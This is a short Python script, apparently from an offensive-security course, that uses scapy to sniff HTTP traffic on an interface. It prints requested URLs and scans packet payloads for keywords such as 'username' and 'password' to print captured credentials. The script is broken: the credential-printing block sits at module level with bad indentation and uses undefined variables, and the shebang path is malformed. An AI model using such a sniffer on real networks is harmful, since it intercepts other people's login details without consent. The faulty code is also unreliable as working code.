#!usr/bin/env python

import scapy.all as scapy
from scapy_http import http


def sniff(interface):
    scapy.sniff(iface= interface, store= False, prn= process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Request >> ' + url)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['username', 'user', 'login', 'password', 'pass']
        for word in keywords:
            if word in load:
                return load
                
login_info = get_login_info(packet)
    if login_info:
        print('\n\n[+] Possible username/password > ' + load + '\n\n')


sniff("eth0")